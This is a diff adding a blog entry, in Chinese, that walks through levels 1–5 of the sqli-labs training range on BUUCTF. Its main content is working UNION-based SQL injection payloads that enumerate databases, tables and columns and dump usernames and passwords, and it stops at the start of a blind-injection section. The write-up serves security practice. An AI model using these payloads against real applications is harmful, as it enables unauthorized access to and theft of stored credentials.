@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>SQL-labs靶场通关</title>
+      <link href="/2024/12/22/SQL-labs%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/"/>
+      <url>/2024/12/22/SQL-labs%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/</url>
+      
+        <content type="html"><![CDATA[<blockquote><p>靶场地址：<a href="https://buuoj.cn/challenges#sqli-labs">BUUCTF在线评测</a></p></blockquote><h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><p>GET传参 ?id&#x3D;1<br><img src="/SNIPER_FILE/bf52f20479948ae3c94db8829592eb73_MD5.jpeg"></p><p>传参2回显不同，说明传入的参数是会进入数据库语句的</p><p><code>1&#39;</code> 单引号报错，这里有报错注入<br><img src="/SNIPER_FILE/0af604d9a444e02be20bb5d7b50ff5f8_MD5.jpeg"></p><p><code>1&#39;--+</code><br><img src="/SNIPER_FILE/ad4c34712b16f5da90aff0ecddc85a14_MD5.jpeg"></p><p>可以判断出是字符型且存在SQL注入</p><p>联合查询爆出列数，3列能正常回显</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1'UNION SELECT 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/1eb747fd3e620bdbb4ebbf430520d4cf_MD5.jpeg"></p><p>确定回显位<br><img src="/SNIPER_FILE/7b05974a10e1da5c1879c7ed8bbbd552_MD5.jpeg"></p><p>爆库，库名为 security </p><pre class="line-numbers language-text" data-language="text"><code class="language-text">-1'UNION SELECT 1,2,database()--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆表，库中有表 emails, referers, uagents, users</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">-1'UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆users表的字段</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">-1'UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/ba80e76bac98f19e3e11052afe732797_MD5.jpeg"></p><p>爆 username 和 password 列的数据</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">-1'UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '&lt;br>') from users--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/6ef05546d1710f6aea02326ac0b8ddd5_MD5.jpeg"></p><h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><p>还是GET传参，id?&#x3D;1</p><p><code>1&#39;</code>单引号报错<br><img src="/SNIPER_FILE/629cd3175a7a2ec059bf1ff3b1fdb4ec_MD5.jpeg"></p><p><code>1&#39;--+</code>还是报错，看来是字符型<br><img src="/SNIPER_FILE/7abe3f752d68c1e9e4ac58549624bae9_MD5.jpeg"></p><p>然后跟level1一样了，把单引号去了就行<br><img src="/SNIPER_FILE/bb3bb333377d3af4f7dfec592006b912_MD5.jpeg"></p><h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><p>单引号报错，注释后面的也报错，是字符型，但是这里的报错要注意</p><p><img src="/SNIPER_FILE/e5d773c3740dbff66a88890c15ec3dfe_MD5.jpeg"></p><p>所以我们需要将括号闭合</p><p>爆列数：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">id=-1') union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/44635ec4a33ed787d8cfb0ae2adb3657_MD5.jpeg"></p><p>然后就是跟前面一样<br><img src="/SNIPER_FILE/114819b199c72e6933feb74b5553bc17_MD5.jpeg"></p><h1 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h1><p>单引号没反应，双引号报错了，双引号的字符型<br><img src="/SNIPER_FILE/964a833c2c6d791c5ea5cba77438acdd_MD5.jpeg"></p><p>注意括号闭合，跟level3一样<br><img src="/SNIPER_FILE/7ab66e7d9a58913596eb76f7d2ed6b15_MD5.jpeg"></p><p>爆库</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">-1") union select 1,2,database()--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆字段</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">-1") UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '&lt;br>') from users--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h1><p>id&#x3D;1，回显了一个 “You are in”<br><img src="/SNIPER_FILE/2056d2fe10bbf187f0108da429847a99_MD5.jpeg"></p><p>单引号报错<br><img src="/SNIPER_FILE/54ae93969a70a1a642189e336a6dda0d_MD5.jpeg"></p><p>是字符型<br><img src="/SNIPER_FILE/e680cadad695f0424ad2531e6153ce7d_MD5.jpeg"></p><p>爆列数：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">id=1' union select 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/7df21af07b6ff5f2b32d87c9deab9bda_MD5.jpeg"></p><p>但是没有回显点，bool盲注</p><p>爆库：</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> pentest </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web学习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>2024-12第三周2：normalbabynote</title>
       <link href="/2024/12/21/2024-12%E7%AC%AC%E4%B8%89%E5%91%A82%EF%BC%9Anormalbabynote/"/>
       <url>/2024/12/21/2024-12%E7%AC%AC%E4%B8%89%E5%91%A82%EF%BC%9Anormalbabynote/</url>
